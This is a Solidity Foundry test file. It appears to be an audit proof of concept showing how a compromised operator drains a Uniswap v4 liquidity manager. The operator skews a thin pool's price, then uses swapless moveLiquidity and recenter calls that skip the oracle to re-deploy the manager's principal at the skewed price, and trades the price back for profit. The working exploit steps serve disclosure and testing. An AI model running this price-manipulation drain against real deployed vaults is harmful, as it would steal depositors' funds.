// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

import {VolatileLPManager} from "../src/VolatileLPManager.sol";
import {V4PositionManager} from "../src/abstract/V4PositionManager.sol";
import {PositionState} from "../src/lib/PositionState.sol";
import {MockERC20} from "./helpers/Mocks.sol";

import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {ModifyLiquidityParams, SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";

/// @notice Audit 2026-09-04, H-1 PoC. A compromised operator extracts principal WITHOUT any manager
/// swap: it skews a configured pool's spot price with its own capital, re-deploys the manager's
/// principal at that price through a swapless `moveLiquidity` / `recenter` (neither consults the
/// oracle when `swapAmountIn == 0`), then trades the price back through the manager's freshly
/// concentrated liquidity. The manager buys the pumped token at the pumped price; the attacker pockets
/// the difference. Same mechanism as the Gamma Strategies (2024-01) and Beefy CLM (Cyfrin) findings.
contract Audit20260904SwaplessDrainPoC is Test {
    using StateLibrary for IPoolManager;

    PoolManager internal poolManager;
    PoolModifyLiquidityTest internal lpRouter;
    PoolSwapTest internal swapRouter;
    VolatileLPManager internal mgr;

    Currency internal c0;
    Currency internal c1;
    PoolKey internal keyA; // deep pool, the position lives here
    PoolKey internal keyB; // thin pool, also configured — cheap to skew
    PoolId internal poolA;
    PoolId internal poolB;

    address internal owner = address(0xA11CE);
    address internal bot = address(0xB07); // the compromised operator + its trading capital
    address internal treasury = address(0xFEE5);
    address internal lp = address(0xABCD);

    int24 internal constant SPACING = 60;
    int24 internal constant PUMP_TICK = 6000; // ≈ +82 % on token0
    bytes32 internal constant SALT_A = bytes32(uint256(1));
    bytes32 internal constant SALT_B = bytes32(uint256(2));

    function setUp() public {
        poolManager = new PoolManager(address(this));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(poolManager)));
        swapRouter = new PoolSwapTest(IPoolManager(address(poolManager)));

        Currency a = Currency.wrap(address(new MockERC20()));
        Currency b = Currency.wrap(address(new MockERC20()));
        (c0, c1) = Currency.unwrap(a) < Currency.unwrap(b) ? (a, b) : (b, a);

        keyA = PoolKey({currency0: c0, currency1: c1, fee: 3000, tickSpacing: SPACING, hooks: IHooks(address(0))});
        keyB = PoolKey({currency0: c0, currency1: c1, fee: 500, tickSpacing: SPACING, hooks: IHooks(address(0))});
        poolA = keyA.toId();
        poolB = keyB.toId();
        poolManager.initialize(keyA, TickMath.getSqrtPriceAtTick(0));
        poolManager.initialize(keyB, TickMath.getSqrtPriceAtTick(0));
        _seed(keyA, 1_000_000e18); // deep
        _seed(keyB, 2_000e18); // thin

        VolatileLPManager impl = new VolatileLPManager(IPoolManager(address(poolManager)), treasury);
        mgr = VolatileLPManager(payable(Clones.clone(address(impl))));
        PoolKey[] memory cfgs = new PoolKey[](2);
        cfgs[0] = keyA;
        cfgs[1] = keyB;
        mgr.initialize(
            VolatileLPManager.InitParams({owner: owner, name: bytes32("Vol"), descriptor: address(0), pools: cfgs})
        );
        MockERC20(Currency.unwrap(c0)).mint(address(mgr), 500e18);
        MockERC20(Currency.unwrap(c1)).mint(address(mgr), 500e18);

        vm.prank(owner);
        mgr.setOperator(bot, true);
        // NOTE: no price oracle is needed for the attack — no manager swap ever runs.

        MockERC20(Currency.unwrap(c0)).mint(bot, 10_000e18);
        MockERC20(Currency.unwrap(c1)).mint(bot, 10_000e18);
        vm.startPrank(bot);
        MockERC20(Currency.unwrap(c0)).approve(address(swapRouter), type(uint256).max);
        MockERC20(Currency.unwrap(c1)).approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
    }

    // ────────── the attack, through moveLiquidity (task_051) ──────────

    function test_H1_operatorDrainsPrincipal_swaplessMoveIntoSkewedPool() public {
        uint128 liq = _open(poolA, SALT_A, -60, 60, 500e18);
        uint256 mgrBefore = _managerValue();
        uint256 botBefore = _balance(bot);

        // 1. Pump the thin configured pool with the attacker's own capital (no manager involvement).
        _swap(keyB, false, PUMP_TICK);
        (, int24 tick,,) = IPoolManager(address(poolManager)).getSlot0(poolB);
        assertGe(tick, PUMP_TICK - 1, "pool B skewed");

        // 2. Operator moves the whole principal into a narrow range AT the skewed price. No swap ⇒ no
        //    oracle check; `minLiquidity = 0` and the range are operator-chosen.
        vm.prank(bot);
        mgr.moveLiquidity(SALT_A, liq, _leg(poolB, SALT_B, PUMP_TICK - 60, PUMP_TICK + 60, 499e18));
        assertGt(mgr.positionOf(SALT_B).liquidity, 0, "principal now sits at the skewed price");

        // 3. Trade the price back through the manager's concentrated liquidity.
        _swap(keyB, true, 0);
        (, tick,,) = IPoolManager(address(poolManager)).getSlot0(poolB);
        assertLe(tick, 1, "pool B restored to 1:1");

        uint256 mgrAfter = _managerValue();
        uint256 botAfter = _balance(bot);
        console2.log("manager value before / after (1:1 units):", mgrBefore, mgrAfter);
        console2.log("manager loss bps:", (mgrBefore - mgrAfter) * 10_000 / mgrBefore);
        console2.log("attacker profit:", botAfter - botBefore);
        assertLt(mgrAfter, mgrBefore, "manager lost principal");
        assertGt(botAfter, botBefore, "operator profited");
        assertGt((mgrBefore - mgrAfter) * 10_000 / mgrBefore, 1_000, "loss exceeds 10% of the portfolio");
    }

    // ────────── the same, in-pool, through recenter (pre-existing surface) ──────────

    function test_H1_operatorDrainsPrincipal_swaplessRecenterAtSkewedPrice() public {
        _open(poolB, SALT_B, -60, 60, 500e18);
        uint256 mgrBefore = _managerValue();
        uint256 botBefore = _balance(bot);

        _swap(keyB, false, PUMP_TICK);
        vm.prank(bot);
        mgr.recenter(
            VolatileLPManager.RecenterParams({
                salt: SALT_B,
                // The freed position is single-sided (all token1 after the pump), so the new range sits
                // entirely below the skewed price: it holds only token1 and buys token0 on the way down.
                newTickLower: PUMP_TICK - 120,
                newTickUpper: PUMP_TICK - 60,
                zeroForOne: false,
                swapAmountIn: 0,
                swapPriceLimit: 0,
                minAmountOut: 0,
                minLiquidity: 0
            })
        );
        _swap(keyB, true, 0);

        uint256 mgrAfter = _managerValue();
        console2.log("recenter: manager loss bps:", (mgrBefore - mgrAfter) * 10_000 / mgrBefore);
        console2.log("recenter: attacker profit:", _balance(bot) - botBefore);
        assertLt(mgrAfter, mgrBefore, "manager lost principal");
        assertGt(_balance(bot), botBefore, "operator profited");
    }

    // ────────── helpers ──────────

    /// @dev Swap in `k` until the price reaches `limitTick` (exact-in, oversized; the limit stops it).
    function _swap(PoolKey memory k, bool zeroForOne, int24 limitTick) internal {
        vm.prank(bot);
        swapRouter.swap(
            k,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -5_000e18,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(limitTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _seed(PoolKey memory k, uint256 liquidity) internal {
        MockERC20(Currency.unwrap(c0)).mint(lp, 4_000_000e18);
        MockERC20(Currency.unwrap(c1)).mint(lp, 4_000_000e18);
        vm.startPrank(lp);
        MockERC20(Currency.unwrap(c0)).approve(address(lpRouter), type(uint256).max);
        MockERC20(Currency.unwrap(c1)).approve(address(lpRouter), type(uint256).max);
        lpRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({tickLower: -887220, tickUpper: 887220, liquidityDelta: int256(liquidity), salt: 0}),
            ""
        );
        vm.stopPrank();
    }

    function _leg(PoolId pid, bytes32 salt, int24 tl, int24 tu, uint256 amt)
        internal
        pure
        returns (VolatileLPManager.VolatileAllocLeg memory)
    {
        return VolatileLPManager.VolatileAllocLeg({
            poolId: pid,
            salt: salt,
            tickLower: tl,
            tickUpper: tu,
            zeroForOne: false,
            swapAmountIn: 0,
            swapPriceLimit: 0,
            minAmountOut: 0,
            amount0Desired: amt,
            amount1Desired: amt,
            minLiquidity: 0
        });
    }

    function _open(PoolId pid, bytes32 salt, int24 tl, int24 tu, uint256 amt) internal returns (uint128) {
        VolatileLPManager.VolatileAllocLeg[] memory legs = new VolatileLPManager.VolatileAllocLeg[](1);
        legs[0] = _leg(pid, salt, tl, tu, amt);
        vm.prank(owner);
        mgr.allocate(legs);
        return mgr.positionOf(salt).liquidity;
    }

    /// @dev Everything the manager owns, valued at the true 1:1 price: idle + principal + fees.
    function _managerValue() internal view returns (uint256 v) {
        v = _balance(address(mgr));
        bytes32[2] memory salts = [SALT_A, SALT_B];
        for (uint256 i = 0; i < 2; ++i) {
            V4PositionManager.Position memory p = mgr.positionOf(salts[i]);
            if (p.liquidity == 0) continue;
            (uint256 a0, uint256 a1, uint256 f0, uint256 f1) =
                PositionState.value(IPoolManager(address(poolManager)), address(mgr), salts[i], p);
            v += a0 + a1 + f0 + f1;
        }
    }

    function _balance(address who) internal view returns (uint256) {
        return MockERC20(Currency.unwrap(c0)).balanceOf(who) + MockERC20(Currency.unwrap(c1)).balanceOf(who);
    }
}
